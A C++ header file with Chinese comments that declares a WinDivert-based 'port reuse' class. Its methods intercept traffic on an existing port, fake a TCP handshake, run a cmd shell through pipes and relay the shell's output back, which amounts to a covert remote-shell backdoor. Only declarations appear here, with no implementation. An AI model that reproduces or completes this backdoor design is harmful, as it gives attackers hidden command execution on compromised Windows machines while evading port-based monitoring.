#pragma once
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <process.h>
#include "windivert.h"

using namespace std;

class CPortReuse
{
private:
	UINT8* m_packet_template;
	UINT m_template_packet_len;
	WINDIVERT_ADDRESS* m_addr_template;
	HANDLE m_divert_handle;

	// shell用管道结构体
	HANDLE m_std_in_rd = NULL;
	HANDLE m_std_in_wr = NULL;
	HANDLE m_std_out_rd = NULL;
	HANDLE m_std_out_wr = NULL;
	PROCESS_INFORMATION m_proc_info;
	HANDLE m_read_thread = NULL; 
	unsigned m_thread_id;

public:
	CPortReuse();
	~CPortReuse();
	void start();

private:
	void get_packet_template(UINT8* packet, UINT recv_len);								// 格式化标准发送包
	void get_addr_template(PWINDIVERT_ADDRESS addr);
	void send_response_packet(UINT8* packet, UINT recv_len);							// 发送确收包
	void send_data_packet(const char* payload_buf);										// 发送数据包
	BOOL init_divert(const char* filter);												// 初始化windivert
	void run_shell();																	// 打开shell
	void exit_shell();																	// 退出shell
	void add_seq(UINT seq);																// 添加标准包的seq
	void send_connect_reponse(UINT8* packet, UINT recv_len);								// 模拟tcp三次握手
	static unsigned WINAPI read_from_cmd(void* ptr);									// 读取cmd输出线程
};